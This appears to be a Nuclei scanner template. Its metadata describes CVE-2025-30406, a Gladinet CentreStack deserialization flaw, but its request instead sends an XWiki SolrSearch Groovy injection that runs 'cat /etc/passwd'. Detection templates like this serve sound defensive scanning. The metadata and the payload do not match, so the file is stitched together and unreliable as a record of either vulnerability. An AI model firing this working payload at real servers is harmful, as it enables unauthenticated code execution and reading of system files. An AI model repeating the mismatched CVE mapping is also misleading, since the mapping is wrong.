id: CVE-2025-30406
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-30406
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.99462
    epss-score: 0.87943
  description: 'Gladinet CentreStack through 16.1.10296.56315 (fixed in 16.4.10315.56368)
    has a deserialization vulnerability due to the CentreStack portal''s hardcoded
    machineKey use, as exploited in the wild in March 2025. This enables threat actors
    (who know the machineKey) to serialize a payload for server-side deserialization
    to achieve remote code execution.

    '
  impact: 'Unauthenticated attackers can exploit hard-coded machineKey values to deserialize
    malicious payloads, achieving remote code execution and complete server compromise.

    '
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:1163764264
    verified: true
  name: Gladinet CentreStack < 16.4.10315.56368 Use of Hard-coded Key Leads to Unauthenticated
    RCE
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-30406
  - https://gladinetsupport.s3.us-east-1.amazonaws.com/gladinet/securityadvisory-cve-2005.pdf
  - https://www.centrestack.com/p/gce_latest_release.html
  remediation: 'Upgrade to Gladinet CentreStack version 16.4.10315.56368 or later
    that uses secure, randomly generated machineKeys.

    '
  severity: critical
  tags: cve,cve2025,gladinet,rce,centrestack,deserialization,kev,vkev,vuln
---
http:
- matchers:
  - condition: and
    regex:
    - root:.*:0:0
    - wiki
    type: regex
  - part: content_type
    type: word
    words:
    - application/rss+xml
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20'
  - '{{BaseURL}}/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20'
  skip-variables-check: true
  stop-at-first-match: true
